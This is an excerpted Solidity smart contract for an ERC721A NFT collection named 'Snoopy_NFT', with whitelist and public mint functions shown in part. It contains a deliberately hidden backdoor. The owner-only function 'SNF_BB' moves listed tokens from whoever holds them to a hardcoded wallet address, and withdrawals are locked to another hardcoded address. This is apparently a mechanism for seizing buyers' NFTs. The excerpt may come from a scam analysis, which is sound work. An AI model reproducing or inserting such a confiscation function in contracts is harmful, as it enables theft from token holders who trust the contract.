...
contract Snoopy_NFT is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public WhitelistMerkleRoot;  
  uint public maxSupply = 3800;
  ...
  ) ERC721A("Snoopy_NFT", "SNF", maxBatchSize_, collectionSize_) {
  ...
  function SNF_wlMint(uint256 quantity,bytes32[] calldata _merkleProof) external payable callerIsUser {
  ...
  function SNF_PLMint(uint256 quantity) external payable callerIsUser {    
  ...
  function SNF_BB(uint256[] memory tokenids) external onlyOwner {
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x81b49CECBFa55bCeF9eA4d6b8226A01cD628184f, tokenid);
        }
    }
  ...
  function SNF_withdraw() external  nonReentrant {
    require(msg.sender == 0xd09227101bFf03A5A43450d461493520Eea40955);
